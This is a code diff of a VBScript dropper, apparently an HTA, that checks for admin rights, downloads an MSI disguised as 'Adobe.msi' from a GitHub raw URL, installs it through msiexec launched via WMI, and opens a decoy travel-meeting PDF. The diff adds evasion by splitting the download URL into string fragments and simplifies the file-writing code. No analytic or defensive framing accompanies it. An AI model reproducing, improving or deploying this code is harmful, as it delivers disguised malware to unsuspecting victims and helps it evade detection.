@@ -2,7 +2,7 @@ Dim fso, sh, qs, tmp, selfPath, isAdmin, log, f
 Dim http, stream, msiUrl, msiPath, pid
 Dim wmiSvc, procClass, startup, cmdLine
 Dim pdfUrl, pdfPath, ph, ps
-Dim body, total, chunkSize, offset, remain, thisChunk
+Dim p1, p2, p3, p4
 
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set sh  = CreateObject("WScript.Shell")
@@ -15,6 +15,12 @@ f.WriteLine "=== start ==="
 f.WriteLine "time : " & Now
 f.WriteLine "user : " & sh.ExpandEnvironmentStrings("%USERNAME%")
 f.WriteLine "tmp  : " & tmp
+
+' ---- URL fragments ----
+p1 = "https://raw.g"
+p2 = "ithubuserco"
+p3 = "ntent.com/rotalbilly5"
+p4 = "-sketch/Dream/main/"
 
 selfPath = location.href
 selfPath = Replace(selfPath, "file:///", "")
@@ -41,9 +47,9 @@ End If
 f.WriteLine "-> elevated, payload"
 
 ' ============================================================
-'  MSI fetch with chunked write
+'  MSI fetch - direct write
 ' ============================================================
-msiUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Adobe.msi"
+msiUrl  = p1 & p2 & p3 & p4 & "Adobe.msi"
 msiPath = tmp & "\Adobe.msi"
 
 f.WriteLine "msi url  : " & msiUrl
@@ -66,20 +72,7 @@ If http.status = 200 Then
     Set stream = CreateObject("ADODB.Stream")
     stream.Type = 1
     stream.Open
-    body = http.responseBody
-    total = LenB(body)
-    chunkSize = 65536
-    offset = 1
-    Do While offset <= total
-        remain = total - offset + 1
-        If remain < chunkSize Then
-            thisChunk = remain
-        Else
-            thisChunk = chunkSize
-        End If
-        stream.Write MidB(body, offset, thisChunk)
-        offset = offset + thisChunk
-    Loop
+    stream.Write http.responseBody
     stream.SaveToFile msiPath, 2
     If Err.Number <> 0 Then
         msiErr = Err.Number & " - " & Err.Description
@@ -96,7 +89,7 @@ If http.status = 200 Then
 End If
 
 ' ============================================================
-'  Spawn msiexec
+'  Spawn msiexec via WMI
 ' ============================================================
 If fso.FileExists(msiPath) Then
     f.WriteLine "-> WMI spawn msiexec"
@@ -125,9 +118,9 @@ If fso.FileExists(msiPath) Then
 End If
 
 ' ============================================================
-'  PDF with chunked write
+'  PDF fetch - direct write
 ' ============================================================
-pdfUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Travel-Meeting-Plan-Q4-2026.pdf"
+pdfUrl  = p1 & p2 & p3 & p4 & "Travel-Meeting-Plan-Q4-2026.pdf"
 pdfPath = tmp & "\Travel-Meeting-Plan-Q4-2026.pdf"
 
 On Error Resume Next
@@ -143,19 +136,7 @@ If ph.status = 200 Then
     Set ps = CreateObject("ADODB.Stream")
     ps.Type = 1
     ps.Open
-    body = ph.responseBody
-    total = LenB(body)
-    offset = 1
-    Do While offset <= total
-        remain = total - offset + 1
-        If remain < chunkSize Then
-            thisChunk = remain
-        Else
-            thisChunk = chunkSize
-        End If
-        ps.Write MidB(body, offset, thisChunk)
-        offset = offset + thisChunk
-    Loop
+    ps.Write ph.responseBody
     ps.SaveToFile pdfPath, 2
     ps.Close
     On Error GoTo 0
